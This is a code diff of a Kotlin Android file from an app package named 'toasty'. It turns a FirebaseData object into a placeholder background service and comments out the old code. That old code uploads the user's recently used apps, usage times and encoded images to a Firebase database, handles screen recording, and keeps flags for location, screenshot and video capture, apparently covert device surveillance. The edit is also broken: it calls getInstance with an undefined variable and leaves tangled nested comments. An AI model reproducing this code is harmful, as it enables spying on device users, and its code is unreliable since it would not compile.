@@ -1,8 +1,9 @@
-package com.example.toasty.security
+package com.example.toasty.services
 
 import android.Manifest
 import android.app.Activity
 import android.app.Activity.RESULT_OK
+import android.app.Service
 import android.app.usage.UsageStatsManager
 import android.content.Context
 import android.content.Context.MEDIA_PROJECTION_SERVICE
@@ -13,6 +14,7 @@ import android.graphics.BitmapFactory
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Environment
+import android.os.IBinder
 import android.provider.Settings
 import android.util.Base64
 import android.util.Log
@@ -37,10 +39,33 @@ import java.io.ByteArrayOutputStream
 import java.io.File
 
 
-object FirebaseData {
+class FirebaseDataService : Service(){
 
+    companion object{
+        private const val TAG: String = "FirebaseDataService"
+    }
 
-    private const val TAG: String = "FirebaseData"
+    override fun onBind(intent: Intent?): IBinder? {
+        Log.d(TAG,"onBind call")
+            return null
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Perform your task here (e.g., background work)
+        Thread {
+            // Simulate background work
+            for (i in 1..50) {
+                Thread.sleep(1000) // Sleep for 1 second
+                Log.d(TAG, "Background service is running... $i")
+            }
+
+            stopSelf() // Stop service after work is done
+        }.start()
+
+        return START_STICKY // Restart the service if it is killed
+    }
+
+/*    private const val TAG: String = "FirebaseData"
     private lateinit var databaseReference: DatabaseReference
     var deviceUid: String = "Android"
     private val deviceVersion: String = Build.VERSION.RELEASE
@@ -129,8 +154,8 @@ object FirebaseData {
                         usageStats?.packageName to (usageStats?.totalTimeInForeground ?: 0)
                     )
                     Log.d(TAG, "Last opened app: ${usageStats?.packageName}")
-                    /*val ref = databaseReference.child("lastOpenedApp")
-                        .child(usageStats?.packageName.toString())*/
+                    *//*val ref = databaseReference.child("lastOpenedApp")
+                        .child(usageStats?.packageName.toString())*//*
                     if (usageStats?.totalTimeInForeground?.div(60000)!! > 0) {
                         // Time in foreground min
                         databaseReference.child("lastOpenedApp")
@@ -173,13 +198,13 @@ object FirebaseData {
                             CommonUtils.convertTimestampToDate(it)
                         }
                     }"
-                    /* == ${usageStats?.lastTimeVisible} ${
+                    *//* == ${usageStats?.lastTimeVisible} ${
                          usageStats?.lastTimeVisible?.let {
                              CommonUtils.convertTimestampToDate(
                                  it
                              )
                          }
-                     }*/
+                     }*//*
                     databaseReference.child("lastOpenedApp")
                         .child(usageStats?.packageName.toString().replace('.', '_'))
                         .child("lastTimeUsed")
@@ -204,10 +229,10 @@ object FirebaseData {
     private fun callWorkManagerInstalledApp(context: Context){
         // Enqueue the WorkRequest
         val workRequest = OneTimeWorkRequestBuilder<MyWorkerInstalledAppInfo>().build()
-        WorkManager.getInstance(context).enqueue(workRequest)
+        WorkManager.getInstance(a).enqueue(workRequest)
 
         // Observe WorkManager's progress
-    /*    WorkManager.getInstance(context).getWorkInfoByIdLiveData(workRequest.id)
+        WorkManager.getInstance(context).getWorkInfoByIdLiveData(workRequest.id)
             .observe(context) { workInfo ->
                 if (workInfo != null && workInfo.state.isFinished) {
                     // Get output data
@@ -215,7 +240,7 @@ object FirebaseData {
                     Log.d(MyWorkerInstalledAppInfo.TAG, "Work Finished: $result")
                     //Toast.makeText(this, result, Toast.LENGTH_SHORT).show()
                 }
-            }*/
+            }
     }
 
 
@@ -398,19 +423,19 @@ object FirebaseData {
         imageName?.let {
             databaseReference.child("images").child(it).setValue(encodedImage)
                 .addOnSuccessListener {
-                    /*Toast.makeText(
+                    *//*Toast.makeText(
                         this,
                         "Image saved to Realtime Database $imageName",
                         Toast.LENGTH_SHORT
-                    ).show()*/
+                    ).show()*//*
                     Log.d(TAG, "Image saved to Realtime Database $imageName")
                 }
                 .addOnFailureListener { exception ->
-                    /*Toast.makeText(
+                    *//*Toast.makeText(
                         this,
                         "Failed to save image: ${exception.message}",
                         Toast.LENGTH_SHORT
-                    ).show()*/
+                    ).show()*//*
                     Log.d(TAG, "Failed to save image: ${exception.message}")
                 }
         }
@@ -488,12 +513,12 @@ object FirebaseData {
         //Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
     }
 
-    /*    override fun onDestroy() {
+    *//*    override fun onDestroy() {
             super.onDestroy()
             stopScreenRecording()
-        }*/
+        }*//*
 
-    /*    @RequiresApi(Build.VERSION_CODES.O)
+    *//*    @RequiresApi(Build.VERSION_CODES.O)
         override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
             super.onActivityResult(requestCode, resultCode, data)
             if (requestCode == SCREEN_RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
@@ -519,7 +544,7 @@ object FirebaseData {
             } else {
                 Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
             }
-        }*/
+        }*//*
 
 
     data class User(
@@ -533,6 +558,6 @@ object FirebaseData {
         val locationStart: Boolean = false,
         val screenshotStart: Boolean = false,
         val videoRecordingStart: Boolean = false
-    )
+    )*/
 
 }
